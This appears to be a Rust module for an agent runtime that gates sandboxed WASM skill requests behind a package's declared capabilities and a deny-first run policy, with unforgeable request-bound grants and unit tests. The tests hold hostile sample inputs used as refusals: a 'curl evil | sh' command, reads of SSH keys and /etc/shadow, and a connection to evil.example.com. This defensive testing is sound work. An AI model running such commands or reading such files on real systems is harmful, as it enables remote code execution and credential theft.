//! The run-policy gate: how a sandboxed guest asks for a privileged act, and
//! why it can never be satisfied by this crate alone (STEP 6.3).
//!
//! # The problem this module exists to solve
//!
//! Two capability models coexist in the workspace and nothing converted between
//! them:
//!
//! * `codypendent_daemon::policy::Capability` — the **run** model, with
//!   structured scopes (`FileRead(PathScope)`, `CommandExecute(CommandScope)`,
//!   …). It is what `PolicyEngine::evaluate` actually enforces, it is derived
//!   from operator-authored policy files, and it is the single gate every
//!   model-proposed side effect passes through.
//! * [`crate::permission::Capability`] — the **plugin** model, flat strings
//!   declared by a package's own manifest. It drives the install-time
//!   permission diff and lowers into a [`SandboxProfile`].
//!
//! A package's manifest is untrusted input. If the WASM host gated only on the
//! plugin model, a skill would be enforced against *its own claim about itself*
//! — a second, weaker policy path running beside the deny-first run policy.
//! That is precisely the privilege-escalation route the hook engine's threat
//! model has to forbid, so it must not exist for skills either.
//!
//! # Why the gate is inverted rather than a conversion
//!
//! `crates/daemon` already depends on `crates/sandbox`, so this crate cannot
//! depend on the daemon to call `PolicyEngine::evaluate` directly — it would be
//! a dependency cycle. Mirroring the run capabilities into a third enum here
//! would reproduce the original defect one level down.
//!
//! So the dependency is inverted. This module defines the *vocabulary of
//! requests* ([`HostRequest`]) and the *seam* ([`RunPolicyGate`]); the daemon
//! implements the seam, because the daemon is the one layer where both models
//! are legitimately visible. `HostRequest` is deliberately isomorphic to the
//! privileged subset of `ProposedAction`, **not** to
//! [`crate::permission::Capability`]: it is a request the run policy answers,
//! never a grant the package asserts.
//!
//! # The two gates, and the order they run in
//!
//! [`CapabilityBroker::request`] answers a guest's request only if BOTH agree:
//!
//! 1. the **declaration ceiling** — the package's own [`SandboxProfile`]. A
//!    request the manifest never declared is refused here and never reaches the
//!    run policy, so the run policy's generosity can never exceed the package's
//!    own statement of what it needs.
//! 2. the **run policy** — the [`RunPolicyGate`]. A request the manifest did
//!    declare is still refused unless the operator's deny-first policy (and any
//!    approval it demands) allows it, so a package's manifest can never exceed
//!    the operator's policy.
//!
//! Ceiling first: it is pure, deterministic, and cheap, so a hostile package
//! cannot use undeclared requests to probe the operator's policy configuration
//! or to drive approval-prompt spam.
//!
//! # The unforgeable grant
//!
//! [`GateGrant`] is the proof a request was authorized. It has private fields,
//! no `Default`, no `Deserialize`, and no public constructor. The only way to
//! mint one is [`GateGrant::issue`], which requires a [`GateSeal`] — and a
//! `GateSeal` can only be constructed inside this crate, by the host, once per
//! in-flight request. An external `RunPolicyGate` implementation therefore
//! cannot fabricate approval out of band, and a future host function that
//! forgets to consult the broker fails to *compile* rather than failing open.
//!
//! The grant is additionally bound to a digest of the exact request it answers,
//! so a grant issued for one path cannot be replayed against another.

use sha2::{Digest, Sha256};

use crate::profile::SandboxProfile;

/// A privileged act a sandboxed guest asks the host to perform on its behalf.
///
/// This is the *request* vocabulary. It carries concrete, guest-supplied values
/// (a path, a `host:port`, an argv) because those values are exactly what the
/// run policy must scope-check — a request without them could only be answered
/// by trusting the package.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostRequest {
    /// Read the file at `path`.
    ReadFile {
        /// Guest-supplied, not yet canonicalized. The gate canonicalizes.
        path: String,
    },
    /// Write the file at `path`.
    WriteFile {
        /// Guest-supplied, not yet canonicalized.
        path: String,
    },
    /// Execute `program` with `args`.
    RunCommand {
        /// The program name or absolute path, matched by the run policy's
        /// `CommandScope` with exact string equality — never by basename.
        program: String,
        /// Arguments, passed verbatim.
        args: Vec<String>,
    },
    /// Open a network connection to `host:port`.
    Connect {
        /// Destination host.
        host: String,
        /// Destination port.
        port: u16,
    },
    /// Read the named brokered secret.
    ///
    /// No shipped gate grants this: the brokered-secrets daemon does not exist
    /// (see `.impl/threat-models/12-executable-skills.md` §6.5). The variant is
    /// here so the declaration ceiling covers `brokered_secrets` — which
    /// otherwise has no reader at all — and so the request shape is fixed
    /// before a broker is written rather than after.
    ReadSecret {
        /// The secret's name as declared in the manifest.
        name: String,
    },
}

impl HostRequest {
    /// The request class, used for audit lines and denial codes.
    #[must_use]
    pub fn class(&self) -> &'static str {
        match self {
            HostRequest::ReadFile { .. } => "file-read",
            HostRequest::WriteFile { .. } => "file-write",
            HostRequest::RunCommand { .. } => "command-execute",
            HostRequest::Connect { .. } => "network-connect",
            HostRequest::ReadSecret { .. } => "secret-read",
        }
    }

    /// A one-line, log-safe rendering of the request. Guest-supplied values are
    /// included because the operator needs to see what was asked for; they are
    /// never interpreted as markup by any consumer of this string.
    #[must_use]
    pub fn describe(&self) -> String {
        match self {
            HostRequest::ReadFile { path } => format!("file-read {path}"),
            HostRequest::WriteFile { path } => format!("file-write {path}"),
            HostRequest::RunCommand { program, args } => {
                format!("command-execute {program} {}", args.join(" "))
            }
            HostRequest::Connect { host, port } => format!("network-connect {host}:{port}"),
            HostRequest::ReadSecret { name } => format!("secret-read {name}"),
        }
    }

    /// The stable digest a [`GateGrant`] is bound to. Domain-separated and
    /// length-prefixed so no two distinct requests can produce the same digest
    /// by concatenation (the same construction as
    /// [`crate::verify::signing_digest`]).
    fn digest(&self) -> [u8; 32] {
        let mut hasher = Sha256::new();
        hasher.update(b"codypendent-host-request-v1");
        let field = |bytes: &[u8]| {
            let mut h = Sha256::new();
            h.update(bytes);
            h.finalize()
        };
        hasher.update(field(self.class().as_bytes()));
        match self {
            HostRequest::ReadFile { path } | HostRequest::WriteFile { path } => {
                hasher.update(field(path.as_bytes()));
            }
            HostRequest::RunCommand { program, args } => {
                hasher.update(field(program.as_bytes()));
                hasher.update((args.len() as u64).to_be_bytes());
                for arg in args {
                    hasher.update(field(arg.as_bytes()));
                }
            }
            HostRequest::Connect { host, port } => {
                hasher.update(field(host.as_bytes()));
                hasher.update(port.to_be_bytes());
            }
            HostRequest::ReadSecret { name } => {
                hasher.update(field(name.as_bytes()));
            }
        }
        hasher.finalize().into()
    }
}

/// A capability token the host mints for exactly one in-flight request.
///
/// Its only purpose is to make [`GateGrant`] unforgeable outside this crate:
/// the field is private, so no downstream implementation of [`RunPolicyGate`]
/// can construct one, and the only seal an implementation ever sees is the one
/// the broker hands it for the request currently being decided.
#[derive(Debug)]
pub struct GateSeal {
    digest: [u8; 32],
}

/// Proof that a specific [`HostRequest`] was authorized by a [`RunPolicyGate`].
///
/// Deliberately not `Clone`, not `Deserialize`, not `Default`, with no public
/// constructor: a grant cannot be forged from guest-supplied bytes, replayed
/// against a different request, or duplicated to authorize a second act.
#[derive(Debug)]
pub struct GateGrant {
    digest: [u8; 32],
    authority: String,
}

impl GateGrant {
    /// Mint a grant for the request the `seal` was issued for.
    ///
    /// `authority` names the gate that decided (e.g. `run-policy@<version>`)
    /// and appears in the audit record, so a grant is always attributable.
    #[must_use]
    pub fn issue(seal: &GateSeal, authority: impl Into<String>) -> Self {
        Self {
            digest: seal.digest,
            authority: authority.into(),
        }
    }

    /// The gate that authorized this request.
    #[must_use]
    pub fn authority(&self) -> &str {
        &self.authority
    }

    /// Whether this grant actually answers `request`. The host checks this
    /// before acting, so a gate that returns a grant minted for a different
    /// seal cannot authorize the act in front of it.
    #[must_use]
    pub fn answers(&self, request: &HostRequest) -> bool {
        self.digest == request.digest()
    }
}

/// Why a request was refused. Mirrors the run policy's `PolicyReason` shape so
/// a denial can be surfaced verbatim without a second vocabulary.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("{code}: {message}")]
pub struct GateDenied {
    /// A stable dotted identifier, e.g. `sandbox.undeclared-capability`.
    pub code: String,
    /// A human-legible explanation.
    pub message: String,
}

impl GateDenied {
    /// Build a denial from a stable code and a message.
    pub fn new(code: impl Into<String>, message: impl Into<String>) -> Self {
        Self {
            code: code.into(),
            message: message.into(),
        }
    }
}

/// The seam the daemon implements to put a sandboxed guest under the **run**
/// policy — the same deny-first engine every model-proposed side effect passes.
///
/// An implementation maps a [`HostRequest`] onto a `ProposedAction`, evaluates
/// it with the run's `PolicyEngine` and `EvalContext`, resolves any approval the
/// decision demands, and only then calls [`GateGrant::issue`] with the seal it
/// was handed.
///
/// Implementations must **not** consult the package's manifest: the manifest
/// ceiling is applied by [`CapabilityBroker`] before this is ever called, and an
/// implementation that re-derived authority from the manifest would reintroduce
/// the second policy path this seam exists to remove.
pub trait RunPolicyGate: Send + Sync {
    /// Authorize `request`, or refuse it.
    ///
    /// `seal` is valid for this request only; passing it to
    /// [`GateGrant::issue`] is the sole way to produce a grant.
    fn authorize(&self, request: &HostRequest, seal: &GateSeal) -> Result<GateGrant, GateDenied>;
}

/// The fail-closed gate: refuses every request.
///
/// This is what a caller with no daemon behind it gets — tests, the CLI's
/// offline paths, and any future caller that has not yet been wired to the run
/// policy. A guest running under it can compute, and nothing else.
#[derive(Debug, Default, Clone, Copy)]
pub struct DenyAllGate;

impl RunPolicyGate for DenyAllGate {
    fn authorize(&self, request: &HostRequest, _seal: &GateSeal) -> Result<GateGrant, GateDenied> {
        Err(GateDenied::new(
            "sandbox.no-run-policy",
            format!(
                "`{}` requires the run policy, which is not available to this caller",
                request.describe()
            ),
        ))
    }
}

impl SandboxProfile {
    /// Whether the package's own manifest declared this request — the
    /// **ceiling**, not a grant.
    ///
    /// A `true` here means only "the package asked for this at install time and
    /// the user saw it in the permission diff". It is a necessary condition for
    /// [`CapabilityBroker::request`], never a sufficient one.
    #[must_use]
    pub fn permits(&self, request: &HostRequest) -> bool {
        match request {
            HostRequest::ReadFile { path } => self.allows_read(path),
            HostRequest::WriteFile { path } => self.allows_write(path),
            // A command grant is coarse in a package manifest (`allow_subprocess`
            // is a bool; the command *names* are not carried on the profile), so
            // the ceiling can only check that subprocess was declared at all.
            // Which programs may run is the run policy's `CommandScope` — see
            // the `RunPolicyGate` contract.
            HostRequest::RunCommand { .. } => self.allow_subprocess,
            HostRequest::Connect { host, port } => self.allows_network(&format!("{host}:{port}")),
            HostRequest::ReadSecret { name } => self.brokered_secrets.iter().any(|s| s == name),
        }
    }
}

/// Composes the declaration ceiling with the run policy. The only supported way
/// to answer a guest's [`HostRequest`].
pub struct CapabilityBroker<'a> {
    profile: &'a SandboxProfile,
    gate: &'a dyn RunPolicyGate,
}

impl<'a> CapabilityBroker<'a> {
    /// Build a broker over a package's profile and the run-policy gate.
    #[must_use]
    pub fn new(profile: &'a SandboxProfile, gate: &'a dyn RunPolicyGate) -> Self {
        Self { profile, gate }
    }

    /// The profile whose declarations form the ceiling.
    #[must_use]
    pub fn profile(&self) -> &SandboxProfile {
        self.profile
    }

    /// Answer a guest request. Refuses unless the manifest declared it **and**
    /// the run policy allows it.
    pub fn request(&self, request: &HostRequest) -> Result<GateGrant, GateDenied> {
        if !self.profile.permits(request) {
            // Deliberately identical shape for "not declared" regardless of
            // which class it was: a guest must not be able to use the denial
            // text to enumerate what the manifest *does* hold.
            return Err(GateDenied::new(
                "sandbox.undeclared-capability",
                format!(
                    "`{}` is not declared by `{}`",
                    request.class(),
                    self.profile.plugin
                ),
            ));
        }
        let seal = GateSeal {
            digest: request.digest(),
        };
        let grant = self.gate.authorize(request, &seal)?;
        // A gate that returns a grant minted for some other seal does not get to
        // authorize the act in front of us.
        if !grant.answers(request) {
            return Err(GateDenied::new(
                "sandbox.grant-mismatch",
                "the run policy returned a grant that does not answer this request",
            ));
        }
        Ok(grant)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> SandboxProfile {
        SandboxProfile {
            plugin: "skill:rust.fix-ci".into(),
            env_allowlist: vec!["PATH".into()],
            read_paths: vec!["/workspace/repo".into()],
            write_paths: vec!["/workspace/repo/target".into()],
            network_allowlist: vec!["api.github.com:443".into()],
            brokered_secrets: vec!["github-token".into()],
            allow_subprocess: false,
            memory_mb: 64,
            cpu_seconds: 5,
            wall_seconds: 10,
            maximum_output_mb: 1,
        }
    }

    /// A gate that allows everything — stands in for a permissive run policy so
    /// the ceiling can be tested in isolation.
    struct AllowAllGate;
    impl RunPolicyGate for AllowAllGate {
        fn authorize(&self, _r: &HostRequest, seal: &GateSeal) -> Result<GateGrant, GateDenied> {
            Ok(GateGrant::issue(seal, "test-allow-all"))
        }
    }

    #[test]
    fn the_default_gate_denies_everything() {
        let p = profile();
        let gate = DenyAllGate;
        let broker = CapabilityBroker::new(&p, &gate);
        // Even a request the manifest fully declares is refused without a run
        // policy behind it — the manifest is a ceiling, never a grant.
        let err = broker
            .request(&HostRequest::ReadFile {
                path: "/workspace/repo/src/lib.rs".into(),
            })
            .unwrap_err();
        assert_eq!(err.code, "sandbox.no-run-policy");
    }

    #[test]
    fn an_undeclared_request_never_reaches_the_run_policy() {
        // AllowAllGate would say yes to anything; the ceiling must refuse first.
        let p = profile();
        let gate = AllowAllGate;
        let broker = CapabilityBroker::new(&p, &gate);
        let err = broker
            .request(&HostRequest::ReadFile {
                path: "/home/user/.ssh/id_rsa".into(),
            })
            .unwrap_err();
        assert_eq!(err.code, "sandbox.undeclared-capability");
        // Undeclared subprocess, undeclared host, undeclared secret: same.
        assert_eq!(
            broker
                .request(&HostRequest::RunCommand {
                    program: "cargo".into(),
                    args: vec![]
                })
                .unwrap_err()
                .code,
            "sandbox.undeclared-capability"
        );
        assert_eq!(
            broker
                .request(&HostRequest::Connect {
                    host: "evil.example.com".into(),
                    port: 443
                })
                .unwrap_err()
                .code,
            "sandbox.undeclared-capability"
        );
        assert_eq!(
            broker
                .request(&HostRequest::ReadSecret {
                    name: "aws-key".into()
                })
                .unwrap_err()
                .code,
            "sandbox.undeclared-capability"
        );
    }

    #[test]
    fn a_denial_does_not_leak_which_capabilities_are_held() {
        // The denial for an undeclared path and an undeclared host must not
        // differ in a way that lets a guest enumerate the manifest.
        let p = profile();
        let gate = AllowAllGate;
        let broker = CapabilityBroker::new(&p, &gate);
        let a = broker
            .request(&HostRequest::ReadFile {
                path: "/etc/shadow".into(),
            })
            .unwrap_err();
        let b = broker
            .request(&HostRequest::WriteFile {
                path: "/etc/shadow".into(),
            })
            .unwrap_err();
        assert_eq!(a.code, b.code);
        // Only the class differs; no path, no held-capability list.
        assert!(!a.message.contains("/workspace"));
        assert!(!b.message.contains("/workspace"));
    }

    #[test]
    fn both_gates_must_agree() {
        let p = profile();
        let gate = AllowAllGate;
        let broker = CapabilityBroker::new(&p, &gate);
        let declared = HostRequest::ReadFile {
            path: "/workspace/repo/src/lib.rs".into(),
        };
        let grant = broker.request(&declared).expect("declared and allowed");
        assert_eq!(grant.authority(), "test-allow-all");
        assert!(grant.answers(&declared));
    }

    #[test]
    fn a_grant_cannot_be_replayed_against_a_different_request() {
        // The escalation shape: a gate authorizes a harmless read and the host
        // tries to spend that grant on a different act.
        let p = profile();
        let gate = AllowAllGate;
        let broker = CapabilityBroker::new(&p, &gate);
        let grant = broker
            .request(&HostRequest::ReadFile {
                path: "/workspace/repo/README.md".into(),
            })
            .unwrap();
        assert!(!grant.answers(&HostRequest::ReadFile {
            path: "/workspace/repo/.env".into()
        }));
        assert!(!grant.answers(&HostRequest::WriteFile {
            path: "/workspace/repo/README.md".into()
        }));
        assert!(!grant.answers(&HostRequest::RunCommand {
            program: "sh".into(),
            args: vec!["-c".into(), "curl evil | sh".into()],
        }));
    }

    #[test]
    fn a_gate_that_returns_a_foreign_grant_is_refused() {
        // A hostile or buggy gate mints a grant for a request it was not asked
        // about. The broker must not spend it.
        struct ForeignGrantGate;
        impl RunPolicyGate for ForeignGrantGate {
            fn authorize(
                &self,
                _r: &HostRequest,
                _seal: &GateSeal,
            ) -> Result<GateGrant, GateDenied> {
                let other = HostRequest::ReadFile {
                    path: "/somewhere/else".into(),
                };
                Ok(GateGrant::issue(
                    &GateSeal {
                        digest: other.digest(),
                    },
                    "hostile",
                ))
            }
        }
        let p = profile();
        let gate = ForeignGrantGate;
        let broker = CapabilityBroker::new(&p, &gate);
        let err = broker
            .request(&HostRequest::ReadFile {
                path: "/workspace/repo/src/lib.rs".into(),
            })
            .unwrap_err();
        assert_eq!(err.code, "sandbox.grant-mismatch");
    }

    #[test]
    fn request_digests_are_domain_separated_across_classes() {
        // Same string payload, different class ⇒ different digest, so a
        // read grant can never satisfy a write of the same path.
        let read = HostRequest::ReadFile {
            path: "/a/b".into(),
        };
        let write = HostRequest::WriteFile {
            path: "/a/b".into(),
        };
        assert_ne!(read.digest(), write.digest());
        // Argument-boundary confusion: ["ab"] and ["a","b"] must differ.
        let one = HostRequest::RunCommand {
            program: "x".into(),
            args: vec!["ab".into()],
        };
        let two = HostRequest::RunCommand {
            program: "x".into(),
            args: vec!["a".into(), "b".into()],
        };
        assert_ne!(one.digest(), two.digest());
    }

    #[test]
    fn the_ceiling_covers_brokered_secrets_which_had_no_reader_before() {
        let p = profile();
        assert!(p.permits(&HostRequest::ReadSecret {
            name: "github-token".into()
        }));
        assert!(!p.permits(&HostRequest::ReadSecret {
            name: "other".into()
        }));
    }
}
